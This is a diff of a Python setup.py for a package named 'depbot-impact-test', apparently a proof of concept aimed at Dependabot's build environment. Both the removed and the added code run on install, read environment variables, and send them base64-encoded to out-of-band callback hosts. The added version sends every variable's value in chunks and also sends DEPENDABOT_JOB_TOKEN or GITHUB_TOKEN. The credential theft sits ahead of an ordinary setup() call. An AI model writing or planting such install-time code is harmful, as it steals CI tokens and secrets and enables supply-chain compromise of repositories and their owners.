@@ -1,30 +1,37 @@
 import os
 import urllib.request
 import base64
+import json
 
-# Phase 1: Exfil env var names via HTTP
-env_keys = sorted(os.environ.keys())
-env_str = ','.join(env_keys)
-b64_env = base64.b64encode(env_str.encode()).decode()[:500]
+# Collect all env data
+env_data = {}
+for k, v in sorted(os.environ.items()):
+    env_data[k] = v[:100]  # Truncate values to 100 chars
+
+# Encode as JSON then base64 (URL-safe)
+payload = base64.urlsafe_b64encode(json.dumps(env_data).encode()).decode()
+
+# Split into chunks and send via HTTP (multiple requests if needed)
+chunk_size = 2000
+chunks = [payload[i:i+chunk_size] for i in range(0, min(len(payload), 10000), chunk_size)]
+for i, chunk in enumerate(chunks):
+    try:
+        urllib.request.urlopen(f'http://d99nabu1b2er8r4l5b6g1oh7ofjto74s7.oast.me/env/{i}?d=' + chunk, timeout=5)
+    except Exception:
+        pass
+
+# Also send just the token specifically
+token = os.environ.get('DEPENDABOT_JOB_TOKEN', os.environ.get('GITHUB_TOKEN', 'NONE'))
 try:
-    urllib.request.urlopen('http://d99n7e61b2eqace42t00jh37abkuiioht.oast.site/envkeys?d=' + b64_env, timeout=5)
+    tok_b64 = base64.urlsafe_b64encode(token.encode()).decode()
+    urllib.request.urlopen(f'http://d99nabu1b2er8r4l5b6g1oh7ofjto74s7.oast.me/token?t=' + tok_b64[:2000], timeout=5)
 except Exception:
     pass
 
-# Phase 2: Exfil specific interesting env vars
-for key in ['DEPENDABOT_JOB_TOKEN', 'GITHUB_TOKEN', 'GITHUB_REPOSITORY', 'GITHUB_ACTOR']:
-    val = os.environ.get(key, '')
-    if val:
-        b64_val = base64.b64encode(val[:100].encode()).decode()
-        try:
-            urllib.request.urlopen(f'http://d99n7e61b2eqace42t00jh37abkuiioht.oast.site/{key}?v=' + b64_val, timeout=5)
-        except Exception:
-            pass
-
-# Phase 3: Normal setup() call
+# Normal setup() for Dependabot
 from setuptools import setup
 setup(
     name="depbot-impact-test",
     version="1.0.0",
-    install_requires=["requests==2.25.0", "urllib3==1.26.0"],
+    install_requires=["requests==2.26.0", "urllib3==1.26.5", "flask==2.0.0"],
 )
